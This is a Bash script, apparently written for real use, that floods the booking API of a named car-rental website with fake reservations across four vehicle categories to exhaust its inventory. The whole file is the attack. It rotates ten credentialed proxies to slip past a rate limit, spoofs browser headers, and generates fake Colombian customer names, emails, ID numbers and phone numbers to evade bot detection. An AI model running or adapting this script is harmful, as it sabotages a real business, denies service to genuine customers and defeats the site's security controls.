#!/bin/bash
# 💣 OPERACIÓN ASIMÉTRICA v3: Rotación de 10 proxies (3 reservas por IP)
# Uso: bash ataque_asimetrico.sh
# ✅ Rota entre 10 proxies cada 3 reservas (evade rate limit de 3/IP)
# ✅ Datos humanos realistas (evade detección de contenido bot)
# ✅ Headers Chrome (evade fingerprinting de User-Agent)

export TARGET="https://oceandrivecarental.com/server/public"

# 🔄 TODOS los 10 proxies disponibles (3 reservas cada uno = 30 por ciclo)
PROXIES=(
    "http://wvnqvmnp:tzc6kv4l6ope@31.59.20.176:6754"
    "http://wvnqvmnp:tzc6kv4l6ope@198.23.239.134:6540"
    "http://wvnqvmnp:tzc6kv4l6ope@45.38.107.97:6014"
    "http://wvnqvmnp:tzc6kv4l6ope@107.172.163.27:6543"
    "http://wvnqvmnp:tzc6kv4l6ope@198.105.121.200:6462"
    "http://wvnqvmnp:tzc6kv4l6ope@216.10.27.159:6837"
    "http://wvnqvmnp:tzc6kv4l6ope@142.111.67.146:5611"
    "http://wvnqvmnp:tzc6kv4l6ope@191.96.254.138:6185"
    "http://wvnqvmnp:tzc6kv4l6ope@31.58.9.4:6077"
    "http://wvnqvmnp:tzc6kv4l6ope@23.26.71.145:5628"
)
TOTAL_PROXIES=${#PROXIES[@]}
MAX_POR_IP=3

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

# 🧑 Pool de nombres colombianos realistas
NOMBRES=(
    "Andrés Felipe Martínez"
    "Carolina Mendoza Ruiz"
    "Juan David Herrera"
    "María Alejandra Torres"
    "Santiago López Giraldo"
    "Valentina Ospina Castro"
    "Camilo Andres Restrepo"
    "Laura Daniela Vargas"
    "Sebastián Morales Ríos"
    "Natalia García Duque"
    "Felipe Ramírez Ochoa"
    "Daniela Mejía Salazar"
    "Julián Esteban Henao"
    "Isabela Cardona Vélez"
    "Mateo Alejandro Muñoz"
)
DOMINIOS=("gmail.com" "hotmail.com" "outlook.com" "yahoo.com" "live.com")

echo "🚀 Operación Asimétrica v3 — Rotación inteligente de 10 proxies..."
echo "📊 Regla WAF detectada: máximo $MAX_POR_IP reservas por IP"
echo "📊 Proxies disponibles: $TOTAL_PROXIES → Capacidad: $((TOTAL_PROXIES * MAX_POR_IP)) reservas por ciclo"
echo ""

TOTAL=0
EXITOSAS=0
FALLIDAS=0
PROXY_IDX=0
CONTADOR_IP=0

for cat in 1 2 3 4; do
    case $cat in
        1) START_BASE="2026-04-21"; DAYS=71; STOCK=1; NOMBRE_CAT="ECONÓMICO" ;;
        2) START_BASE="2026-04-19"; DAYS=73; STOCK=2; NOMBRE_CAT="COMPACTO" ;;
        3) START_BASE="2026-04-20"; DAYS=72; STOCK=3; NOMBRE_CAT="COMPACTO+" ;;
        4) START_BASE="2026-04-18"; DAYS=74; STOCK=1; NOMBRE_CAT="SUV" ;;
    esac

    echo "──────────────────────────────────────────────────"
    echo "💣 CAT $cat ($NOMBRE_CAT) → Desde $START_BASE | $DAYS días | Stock: $STOCK"
    echo "──────────────────────────────────────────────────"

    DIAS=$(php -r "for(\$i=0; \$i<\$argv[2]; \$i++){ echo date('Y-m-d', strtotime(\"\$argv[1] +\$i days\")) . '|' . date('Y-m-d', strtotime(\"\$argv[1] +\".(\$i+1).\" days\")) . '|' . date('md', strtotime(\"\$argv[1] +\$i days\")) . \"\n\"; }" "$START_BASE" "$DAYS")

    for linea in $DIAS; do
        START=$(echo "$linea" | cut -d'|' -f1 | tr -d '\r\n')
        END=$(echo "$linea" | cut -d'|' -f2 | tr -d '\r\n')
        DIA_ID=$(echo "$linea" | cut -d'|' -f3 | tr -d '\r\n')

        for ((u=1; u<=STOCK; u++)); do
            TOTAL=$((TOTAL + 1))

            # 🔄 ROTACIÓN INTELIGENTE: Cambiar proxy cada 3 reservas
            if [ $CONTADOR_IP -ge $MAX_POR_IP ]; then
                PROXY_IDX=$(( (PROXY_IDX + 1) % TOTAL_PROXIES ))
                CONTADOR_IP=0
                
                # Si volvimos al primer proxy, esperar para que se resetee el rate limit
                if [ $PROXY_IDX -eq 0 ]; then
                    echo ""
                    echo "⏳ Ciclo completo de proxies. Esperando 60 seg para reset de rate limit..."
                    sleep 60
                    echo "🔄 Reiniciando ciclo de proxies..."
                    echo ""
                fi
            fi

            PROXY_URL="${PROXIES[$PROXY_IDX]}"
            PROXY_SHOW=$(echo "$PROXY_URL" | grep -oP '@\K[^:]+')
            CONTADOR_IP=$((CONTADOR_IP + 1))

            # 🎭 Datos realistas aleatorios
            NOMBRE_FALSO="${NOMBRES[$RANDOM % ${#NOMBRES[@]}]}"
            DOMINIO="${DOMINIOS[$RANDOM % ${#DOMINIOS[@]}]}"
            NOMBRE_EMAIL=$(echo "$NOMBRE_FALSO" | tr '[:upper:]' '[:lower:]' | tr ' ' '.' | sed 's/[áéíóúñ]//g' | cut -d'.' -f1-2)
            EMAIL="${NOMBRE_EMAIL}.${DIA_ID}@${DOMINIO}"
            DOC="$((10000000 + RANDOM % 90000000))"
            PHONE="+5731$((1000000 + RANDOM % 9000000))"

            echo -n "[*] Cat:$cat $START (U$u) [$PROXY_SHOW $CONTADOR_IP/$MAX_POR_IP] $NOMBRE_FALSO... "

            printf '{"category_id":%d,"start_date":"%s","end_date":"%s","pickup_location":"Aeropuerto","dropoff_location":"Hotel","pickup_time":"12:30","dropoff_time":"10:00","customerDetails":{"name":"%s","email":"%s","phone":"%s","nationality":"Colombia","doc_type":"CC","doc_number":"%s"}}' \
                "$cat" "$START" "$END" "$NOMBRE_FALSO" "$EMAIL" "$PHONE" "$DOC" > payload_tmp.json

            RESULT=$(curl -s -x "$PROXY_URL" \
                -X POST "$TARGET/bookings" \
                -H "Content-Type: application/json" \
                -H "User-Agent: $UA" \
                -H "Accept: application/json, text/plain, */*" \
                -H "Accept-Language: es-CO,es;q=0.9,en;q=0.8" \
                -H "Origin: https://oceandrivecarental.com" \
                -H "Referer: https://oceandrivecarental.com/reservar" \
                -d @payload_tmp.json)

            MSG=$(echo "$RESULT" | jq -r '.message // .error // "Sin respuesta"' 2>/dev/null)
            if echo "$MSG" | grep -qi "confirmed"; then
                echo "✅ CONFIRMADA"
                EXITOSAS=$((EXITOSAS + 1))
            elif echo "$MSG" | grep -qi "Polic"; then
                echo "🚫 IP QUEMADA → Rotando proxy..."
                CONTADOR_IP=$MAX_POR_IP  # Forzar rotación inmediata
            else
                echo "⚠️ $MSG"
                FALLIDAS=$((FALLIDAS + 1))
            fi

            # Delay aleatorio 1-3 seg
            sleep $(( (RANDOM % 3) + 1 ))
        done
    done
done

rm -f payload_tmp.json
echo ""
echo "══════════════════════════════════════════════════"
echo "📊 RESULTADOS FINALES"
echo "══════════════════════════════════════════════════"
echo "Total intentos:  $TOTAL"
echo "✅ Exitosas:     $EXITOSAS"
echo "🚫 Bloqueadas:   $FALLIDAS"
echo "Tasa de éxito:   $(( (EXITOSAS * 100) / (TOTAL > 0 ? TOTAL : 1) ))%"
echo ""
echo "👉 Ejecuta 'bash scanner_abril.sh' para verificar el bloqueo."
